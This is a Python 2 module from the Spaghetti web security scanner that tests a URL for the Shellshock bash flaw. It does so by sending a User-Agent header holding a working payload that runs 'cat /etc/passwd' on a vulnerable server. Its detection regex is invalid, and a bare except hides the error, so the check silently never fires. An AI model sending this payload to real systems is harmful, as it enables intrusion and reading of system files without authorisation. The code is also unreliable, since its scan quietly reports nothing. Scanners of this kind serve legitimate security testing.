#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#
# @name:    Spaghetti - Web Application Security Scanner
# @repo:    https://github.com/m4ll0k/Spaghetti
# @author:  Momo Outaadi (M4ll0k)
# @license: See the file 'LICENSE.txt'

import re

from utils import output
from request import request

class Shellshock:
	def __init__(self,agent,proxy,redirect,timeout,url,cookie):
		self.url = url 
		self.cookie = cookie
		self.output = output.Output()
		self.request = request.Request(
			agent = '() { foo;}; echo Content-Type: text/plain ; echo ; cat /etc/passwd',
			proxy = proxy,
			redirect = redirect,
			timeout = timeout
			)

	def run(self):
		info = {
		'name'        : 'Shellshock',
		'fullname'    : 'Shellshock',
		'author'      : 'Momo Outaadi (M4ll0k)',
		'description' : 'Checking Shellshock Vulnerability'
		}
		self.output.test('Scanning shellshock vuln..')
		try:
			resp = self.request.send(
				url = self.url,
				method = "GET",
				payload = None,
				headers = None,
				cookies = self.cookie
				)
			if resp.status_code == 200:
				if re.search(r'*?/bin/bash',resp.content,re.I):
					self.output.plus('That site is my be vulnerable to Shellshock.')
		except Exception,e:
			pass